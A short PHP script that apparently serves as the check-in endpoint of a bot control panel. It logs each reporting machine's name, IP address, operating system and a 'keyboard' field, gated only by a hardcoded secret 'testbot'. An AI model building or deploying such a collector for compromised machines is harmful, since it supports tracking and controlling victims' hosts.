<?php
// Definindo encode pra UTF-8
header('Content-type: text/html; charset="utf-8"',true);

require "../helper/class.crud.php";
require "../helper/secure_validation.php";

//change this use key of your bot
$secret_code="testbot";

//register machine
if($_POST['secret_code']==$secret_code)
{
	$crud = new crud();
	$name=htmlentities($_POST['name']); if(!$name) { print "need name"; exit; }
	$date=date('Y-m-d H:i:s');
	$system=htmlentities($_POST['system']); 
	$ip=htmlentities($_POST['ip']);
	$keyboard=htmlentities($_POST['keyboard']);
	$values = array(
		array(
                  'name'=> sanitize($name), 
                  'date'=> sanitize($date), 
                  'ip'=> sanitize($ip), 
                  'system'=> sanitize($system),
		  'keyboard'=> sanitize($keyboard)
                 )
                );
	$crud->dbInsert('machine_report', $values);
} else {
 echo "error at secret code";
}	
?>
